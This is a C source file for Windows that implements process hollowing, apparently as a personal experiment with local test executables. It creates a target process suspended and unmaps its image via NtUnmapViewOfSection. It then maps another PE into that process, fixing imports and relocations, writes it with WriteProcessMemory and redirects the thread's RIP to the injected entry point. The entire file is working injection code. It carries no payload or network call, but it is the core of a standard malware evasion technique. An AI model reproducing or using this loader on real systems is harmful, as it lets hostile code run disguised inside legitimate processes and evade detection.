#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <winternl.h>
#include <Psapi.h>

typedef struct _FULL_LDR_DATA_TABLE_ENTRY {
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	LIST_ENTRY InInitializationOrderLinks;
	PVOID      DllBase;
	PVOID      EntryPoint;
	ULONG      SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
} FULL_LDR_DATA_TABLE_ENTRY, * PFULL_LDR_DATA_TABLE_ENTRY;

typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(
	HANDLE ProcessHandle,
	PVOID BaseAddress
	);



// Define function pointer type matching NtQueryInformationProcess
typedef NTSTATUS(NTAPI* pfnNtQueryInformationProcess)(
	HANDLE ProcessHandle,
	ULONG ProcessInformationClass,
	PVOID ProcessInformation,
	ULONG ProcessInformationLength,
	PULONG ReturnLength
	);

BOOL writeToProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize) {
	SIZE_T bytesWritten;
	if (!WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, &bytesWritten)) {
		printf("[!] WriteProcessMemory failed with error code: %d\n", GetLastError());
		return FALSE;
	}
	if (bytesWritten != nSize) {
		printf("[!] WriteProcessMemory wrote %zu bytes instead of %zu\n", bytesWritten, nSize);
		return FALSE;
	}
	return TRUE;
}


BYTE* remoteVirutalImage = NULL; // global variable to hold the virtual image for the import descriptor function and for easy access in mapPe
PIMAGE_NT_HEADERS remoteNtHeader = NULL; // global variable to hold the ntHeader for the check delta function
PIMAGE_IMPORT_DESCRIPTOR GetImportDescriptor(HANDLE hProcess, LPVOID imageBaseAddress)
{
	FILE* file = fopen("C:\\Users\\Ori\\source\\repos\\test\\x64\\Release\\test.exe", "rb"); // Open the file in binary mode (whichever selected as the target .exe suspended)
	if (!file)
	{
		printf("failed to open file\n");
		return NULL;
	}
	fseek(file, 0, SEEK_END);
	long fileSize = ftell(file);
	rewind(file);
	unsigned char* buffer = (unsigned char*)malloc(fileSize);
	if (!buffer) {
		printf("[!] failed to allocate memory\n");
		free(buffer);
		return NULL;
		
	}
	fread(buffer, 1, fileSize, file); // read the file into the buffer
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)buffer;
	if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		printf("[!] Invalid DOS signature: 0x%X\n", dosHeader->e_magic);
		return (ULONG_PTR)NULL;

	}



	remoteNtHeader = (PIMAGE_NT_HEADERS)(buffer + dosHeader->e_lfanew);
	printf("image base: %p\n",
		(void*)(ULONG_PTR)remoteNtHeader->OptionalHeader.ImageBase);
	if (remoteNtHeader->Signature != IMAGE_NT_SIGNATURE) {
		printf("[!] Invalid NT signature: 0x%X\n", remoteNtHeader->Signature);
		return (ULONG_PTR)NULL;

	}

	DWORD sizeOfImage = remoteNtHeader->OptionalHeader.SizeOfImage;
	 remoteVirutalImage = (BYTE*)VirtualAlloc(
		NULL,
		sizeOfImage,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);

	if (remoteVirutalImage == NULL) {
		printf("[!] VirtualAlloc failed with error code: %d\n", GetLastError());
		free(buffer);
		return NULL;
	}
	if (!ReadProcessMemory(hProcess, imageBaseAddress, remoteVirutalImage, sizeOfImage, NULL)) {
		printf("[!] ReadProcessMemory failed with error code: %d\n", GetLastError());
		free(buffer);
		VirtualFree(remoteVirutalImage, 0, MEM_RELEASE);
		return NULL;
	}

	
	IMAGE_DATA_DIRECTORY importDirectory =
		remoteNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	if (importDirectory.Size != 0) 
	{
		PIMAGE_IMPORT_DESCRIPTOR remoteImportDescriptor =
			(PIMAGE_IMPORT_DESCRIPTOR)(remoteVirutalImage + importDirectory.VirtualAddress);
		return remoteImportDescriptor;
	}
	else
	{
		printf("[!] No import directory found\n");
		free(buffer);
		VirtualFree(remoteVirutalImage, 0, MEM_RELEASE);
		return NULL;
	}
	
}


ULONG_PTR CheckDelta(PIMAGE_NT_HEADERS ntHeader, ULONG_PTR actualImageBase)
{
	return (ULONG_PTR)(actualImageBase - (ULONG_PTR)ntHeader->OptionalHeader.ImageBase);
}

ULONG_PTR MapPe(BYTE* pRawBytes, HANDLE hProcess, PIMAGE_IMPORT_DESCRIPTOR remoteImportDescriptor) /*return entry point*/ {

	if (!hProcess)
	{
		printf("[!] failed to open process \n");
		return (ULONG_PTR)NULL;

	}
	// 1. Get the DOS Header
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)pRawBytes;
	if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		printf("[!] Invalid DOS signature: 0x%X\n", dosHeader->e_magic);
		VirtualFree(remoteVirutalImage, 0, MEM_RELEASE);
		return (ULONG_PTR)NULL;

	}

	// 2. Get the NT Headers
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(pRawBytes + dosHeader->e_lfanew);
	if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
		printf("[!] Invalid NT signature: 0x%X\n", ntHeaders->Signature);
		VirtualFree(remoteVirutalImage, 0, MEM_RELEASE);
		return (ULONG_PTR)NULL;

	}

	// 3. Allocate the actual running space using SizeOfImage, NOT File Size
	DWORD sizeOfImage = ntHeaders->OptionalHeader.SizeOfImage;
	BYTE* pVirtualImage = (BYTE*)VirtualAlloc(
		NULL,
		sizeOfImage,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);

	if (pVirtualImage == NULL) {
		printf("[!] VirtualAlloc failed with error code: %d\n", GetLastError());
		return (ULONG_PTR)NULL;
	}

	// 4. Copy Headers from the raw buffer to the virtual buffer
	DWORD sizeOfHeaders = ntHeaders->OptionalHeader.SizeOfHeaders;
	memcpy(pVirtualImage, pRawBytes, sizeOfHeaders);

	// 5. Parse and copy each section to its proper Virtual Address
	PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
	for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {

		// Skip sections that have no data on disk (like uninitialized data)
		if (sectionHeader[i].SizeOfRawData == 0) continue;

		// Calculate destination in the running memory space
		BYTE* pDest = pVirtualImage + sectionHeader[i].VirtualAddress;

		// Calculate source from  raw file size buffer
		BYTE* pSrc = pRawBytes + sectionHeader[i].PointerToRawData;

		// Copy the section data
		memcpy(pDest, pSrc, sectionHeader[i].SizeOfRawData);
	}

	LPVOID address = VirtualAllocEx(hProcess, NULL, sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	printf("address: %p\n", address);
	if (!address)
	{
		
		printf("[!] failed to allocate memory in remote process \n");
		VirtualFree(pVirtualImage, 0, MEM_RELEASE);
		VirtualFree(remoteVirutalImage, 0, MEM_RELEASE);
		return (ULONG_PTR)NULL;
	}

	ULONG_PTR entryPointRVA = ntHeaders->OptionalHeader.AddressOfEntryPoint;
	ULONG_PTR finalEntryPoint = (ULONG_PTR)address + entryPointRVA;




	IMAGE_DATA_DIRECTORY importDirectory =
		ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

	if (importDirectory.Size != 0) 
	{

		PIMAGE_IMPORT_DESCRIPTOR importDescriptor =
			(PIMAGE_IMPORT_DESCRIPTOR)(pVirtualImage + importDirectory.VirtualAddress);

		while (importDescriptor->Name != 0)
		{
			char* remoteDllName =
				(char*)(remoteVirutalImage + remoteImportDescriptor->Name);
			char* dllName =
				(char*)(pVirtualImage + importDescriptor->Name);

			PIMAGE_IMPORT_DESCRIPTOR search = remoteImportDescriptor;
			if (strcmp(dllName, remoteDllName) != 0)
			{
				while (search->Name != 0)
				{
					remoteDllName =
						(char*)(remoteVirutalImage + search->Name);
					if (strcmp(dllName, remoteDllName) == 0)
					{
						break;
					}
					search++;
				}
			}

			DWORD remoteThunkRVA = search->Characteristics;
			DWORD thunkRVA = importDescriptor->Characteristics;

			DWORD remoteAddressThunkRVA = search->FirstThunk;
			DWORD addressThunkRVA = importDescriptor->FirstThunk;

			if (remoteThunkRVA == 0)
				remoteThunkRVA = search->FirstThunk;

			if (thunkRVA == 0)
				thunkRVA = importDescriptor->FirstThunk;


			PIMAGE_THUNK_DATA nameThunk = (PIMAGE_THUNK_DATA)(pVirtualImage + thunkRVA);
			PIMAGE_THUNK_DATA addressThunk = (PIMAGE_THUNK_DATA)(pVirtualImage + addressThunkRVA);

			PIMAGE_THUNK_DATA remoteNameThunk = (PIMAGE_THUNK_DATA)(remoteVirutalImage + remoteThunkRVA);
			PIMAGE_THUNK_DATA remoteAddressThunk = (PIMAGE_THUNK_DATA)(remoteVirutalImage + remoteAddressThunkRVA);

			PIMAGE_THUNK_DATA remoteSearch = remoteNameThunk;

			while (nameThunk->u1.AddressOfData != 0)
			{
				BOOL ordinal = (nameThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) != 0;

				if (!ordinal)
				{
					PIMAGE_THUNK_DATA searchName = remoteNameThunk;
					PIMAGE_THUNK_DATA searchIAT = remoteAddressThunk;

					PIMAGE_IMPORT_BY_NAME importByName =
						(PIMAGE_IMPORT_BY_NAME)(pVirtualImage + nameThunk->u1.AddressOfData);

					char* functionName = (char*)importByName->Name;

					while (searchName->u1.AddressOfData != 0)
					{
						BOOL remoteOrdinal =
							(searchName->u1.Ordinal & IMAGE_ORDINAL_FLAG) != 0;

						if (!remoteOrdinal)
						{
							PIMAGE_IMPORT_BY_NAME remoteImportByName =
								(PIMAGE_IMPORT_BY_NAME)
								(remoteVirutalImage + searchName->u1.AddressOfData);

							char* remoteFunctionName =
								(char*)remoteImportByName->Name;
							

							if (strcmp(functionName, remoteFunctionName) == 0)
							{
								
								addressThunk->u1.Function =
									searchIAT->u1.Function;

								break;
							}
						}

						searchName++;
						searchIAT++;
					}
				}

				remoteSearch = remoteNameThunk;
				nameThunk++;
				addressThunk++;
			}

			importDescriptor++;
		}
		
	}

		

	    printf("image base: %p \n", (void*)remoteNtHeader->OptionalHeader.ImageBase);
		//------------------------------------------------------------------------------------------------
	    ULONG_PTR delta = CheckDelta(remoteNtHeader, (ULONG_PTR)address);
		printf("delta: 0x%llX\n", (long long)delta);
		if (delta == 0)
		{

			if (WriteProcessMemory(hProcess, address, pVirtualImage, sizeOfImage, NULL))
			{
				printf("[+] Wrote to remote process memory\n");
				VirtualFree(pVirtualImage, 0, MEM_RELEASE);
				VirtualFree(remoteVirutalImage, 0, MEM_RELEASE);
				return finalEntryPoint;
			}
			VirtualFree(pVirtualImage, 0, MEM_RELEASE);
			VirtualFree(remoteVirutalImage, 0, MEM_RELEASE);
			return (ULONG_PTR)NULL;
		}

		else
		{

			IMAGE_DATA_DIRECTORY relocationDirectory = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
			PIMAGE_BASE_RELOCATION pRelocBlock = (PIMAGE_BASE_RELOCATION)(pVirtualImage + relocationDirectory.VirtualAddress);
		
			while (pRelocBlock->SizeOfBlock != 0)
			{
				// Calculate how many relocation entries are in this specific block
				DWORD entryCount = (pRelocBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
				WORD* pRelocEntry = (WORD*)(pRelocBlock + 1); // Entries start right after the block header

				for (DWORD i = 0; i < entryCount; i++)//relocation each entry
				{
					WORD type = pRelocEntry[i] >> 12;
					WORD offset = pRelocEntry[i] & 0x0FFF;

					// IMAGE_REL_BASED_DIR64 (for 64-bit) or IMAGE_REL_BASED_HIGHLOW (for 32-bit)
					// If type is 0 (IMAGE_REL_BASED_ABSOLUTE), it's just padding, so skip it
					if (type == IMAGE_REL_BASED_DIR64 || type == IMAGE_REL_BASED_HIGHLOW) {

						//  Locate the broken pointer in memory
						ULONG_PTR* pPatchAddress = (ULONG_PTR*)(pVirtualImage + pRelocBlock->VirtualAddress + offset);
						// Adjust the broken pointer by adding the Delta
					
							*pPatchAddress += delta;

					}

				}
				pRelocBlock = (PIMAGE_BASE_RELOCATION)((BYTE*)pRelocBlock + pRelocBlock->SizeOfBlock);        // Move to the next relocation block in the table

			}
			DWORD entryPointRVA = ntHeaders->OptionalHeader.AddressOfEntryPoint;

			// 2. Add it to  virtual base to get the absolute address in memory
			ULONG_PTR trueEntryPoint = (ULONG_PTR)address + entryPointRVA;

			printf("trueEntryPoint: %p\n", (void*)trueEntryPoint);


			if (WriteProcessMemory(hProcess, address, pVirtualImage, sizeOfImage, NULL))
			{
				printf("[+] wrote to remote process memory\n");
				VirtualFree(pVirtualImage, 0, MEM_RELEASE);
				VirtualFree(remoteVirutalImage, 0, MEM_RELEASE);
				return trueEntryPoint;
			}

			VirtualFree(pVirtualImage, 0, MEM_RELEASE);
			VirtualFree(remoteVirutalImage, 0, MEM_RELEASE);
			return (ULONG_PTR)NULL;
		}
	}

	


int main(int argc, char* argv[]) {
	
	//----------------------------------------- create a suspended process

	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
	if (!hNtdll) {
		printf("[!] Failed to get ntdll handle\n");
		return 1;
	}

	pfnNtQueryInformationProcess pNtQueryInformationProcess =
		(pfnNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");

	if (!pNtQueryInformationProcess) {
		printf("[!] Failed to resolve NtQueryInformationProcess export\n");
		return 1;
	}


	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	PROCESS_BASIC_INFORMATION pbi = { 0 };
	si.cb = sizeof(si);
	BOOL isProcessCreated = CreateProcessA("C:\\Users\\Ori\\source\\repos\\test\\x64\\Release\\test.exe",NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	if (!isProcessCreated) {
		printf("CreateProcessA failed. Error: %lu\n", GetLastError());
		return 1;
	}


	FILE* file = fopen("C:\\Users\\Ori\\source\\repos\\PeTests\\x64\\Release\\PeTests.exe", "rb");
	if (!file)
	{
		printf("failed to open file\n");

		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return 1;
	}
	fseek(file, 0, SEEK_END);
	long fileSize = ftell(file);
	rewind(file);
	unsigned char* buffer = (unsigned char*)malloc(fileSize);
	if (!buffer) {
		printf("[!] failed to allocate memory\n");
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return 1;
	}


   pNtQueryInformationProcess(pi.hProcess, 0, &pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL);

	uintptr_t pebImageBaseAddress = (uintptr_t)pbi.PebBaseAddress + 0x10;
	LPVOID imageBaseAddress = NULL;
	ReadProcessMemory(pi.hProcess, (LPCVOID)pebImageBaseAddress, &imageBaseAddress, sizeof(imageBaseAddress), NULL);
	if (!imageBaseAddress)
	{
		printf("Failed to find image base\n");
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		free(buffer);
		return 1;
	}
	fread(buffer, 1, fileSize, file);
	ResumeThread(pi.hThread); 
	Sleep(10);
	SuspendThread(pi.hThread);

	PIMAGE_IMPORT_DESCRIPTOR importDescriptor = GetImportDescriptor(pi.hProcess, imageBaseAddress);

	pNtUnmapViewOfSection NtUnmapViewOfSection =
		(pNtUnmapViewOfSection)GetProcAddress(
			hNtdll,
			"NtUnmapViewOfSection"
		);

	if (NtUnmapViewOfSection == NULL) {
		printf("Failed to get NtUnmapViewOfSection\n");
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		free(buffer);
		return 1;
	}
	NTSTATUS status = NtUnmapViewOfSection(pi.hProcess,imageBaseAddress);
	if (!NT_SUCCESS(status))
	{
		printf("status = 0x%08X\n", status);
		printf("NtUnmapViewOfSection: %p\n", NtUnmapViewOfSection);
		printf("hProcess: %p\n", pi.hProcess);
		printf("base: %p\n", imageBaseAddress);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		free(buffer);
		return 1;
	}


	//  ----------------------------------------- map the new image into the suspended process
	if (!importDescriptor)
	{
		printf("importDescriptor was not found \n");
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		free(buffer);
		return 1;
	}
	ULONG_PTR entrypoint = MapPe(buffer,pi.hProcess, importDescriptor);
	if (entrypoint == 0)
	{
		printf("failed to map\n");
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		free(buffer);
		return 1;
	}
	CONTEXT ctx = { 0 };
	ctx.ContextFlags = CONTEXT_FULL;

	if (GetThreadContext(pi.hThread, &ctx)) {
		printf("RIP before: %p\n", (void*)ctx.Rip);
		ctx.Rip = entrypoint;

		printf("RIP setting to: %p\n", (void*)ctx.Rip);
		if (SetThreadContext(pi.hThread, &ctx))
		{
			
			DWORD result = ResumeThread(pi.hThread);

			printf("ResumeThread: %lu\n", result);
			DWORD exitCode;
			 result = WaitForSingleObject(pi.hProcess, 1000);
			GetExitCodeProcess(pi.hProcess, &exitCode);
			printf("Exit code: 0x%08lX\n", exitCode);
			
			
		}
	}
	


	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	free(buffer);
	return 0;
}

